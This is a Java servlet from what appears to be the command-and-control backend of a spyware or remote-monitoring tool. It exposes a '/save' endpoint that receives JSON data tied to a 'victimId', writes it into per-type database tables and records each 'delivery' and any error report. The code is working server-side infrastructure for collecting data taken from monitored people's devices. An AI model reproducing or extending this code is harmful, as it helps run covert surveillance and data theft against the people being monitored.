package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.BaseTable;
import com.theah64.xrob.api.database.tables.Deliveries;
import com.theah64.xrob.api.models.Delivery;
import com.theah64.xrob.api.utils.APIResponse;
import org.json.JSONArray;
import org.json.JSONException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

/**
 * Used to save text data.
 * Created by theapache64 on 11/4/16,10:20 PM.
 */
@WebServlet(urlPatterns = {AdvancedBaseServlet.VERSION_CODE + "/save"})
public class JSONPostServlet extends AdvancedBaseServlet {

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }

    @Override
    protected boolean isSecureServlet() {
        return true;
    }

    @Override
    protected String[] getRequiredParameters() {
        return new String[0];
    }

    @Override
    protected void doAdvancedPost() throws Exception {

        //out
        final PrintWriter out = getWriter();

        final String dataType = getStringParameter(KEY_DATA_TYPE);

        //victim id
        final String victimId = getHeaderSecurity().getVictimId();
        final boolean hasError = super.getBooleanParameter(KEY_ERROR);
        final String message = getStringParameter(KEY_MESSAGE);

        final Delivery delivery = new Delivery(victimId, hasError, message, dataType, -1);
        final Deliveries deliveries = Deliveries.getInstance();

        try {

            if (!hasError) {

                //Has valid data
                final String data = getStringParameter(KEY_DATA);

                if (data != null) {

                    try {
                        final JSONArray jaData = new JSONArray(data);

                        //The delivery is not about the binary, but TEXT, so we need to save the data to the appropriate db table.
                        final BaseTable dbTable = BaseTable.Factory.getTable(dataType);

                        dbTable.addv2(victimId, jaData);

                        //Save delivery details
                        deliveries.addv2(delivery);

                        out.write(new APIResponse("success", null).getResponse());


                    } catch (JSONException e) {
                        e.printStackTrace();

                        //Invalid json
                        throw new Delivery.DamagedPackageException(String.format("Invalid JSON data : %s", e.getMessage()));
                    }

                } else {
                    //Data is null!
                    throw new Delivery.DamagedPackageException("Data can't be null");
                }


            } else {
                //Save delivery details
                deliveries.addv2(delivery);
                //Error report submitted
                out.write(new APIResponse("Error report submitted", null).getResponse());
            }

        } catch (Delivery.DamagedPackageException e) {
            e.printStackTrace();
            delivery.setServerError(true);
            delivery.setServerErrorMessage(e.getMessage());
            deliveries.addv2(delivery);
            throw new Exception(e.getMessage());
        }

    }


}
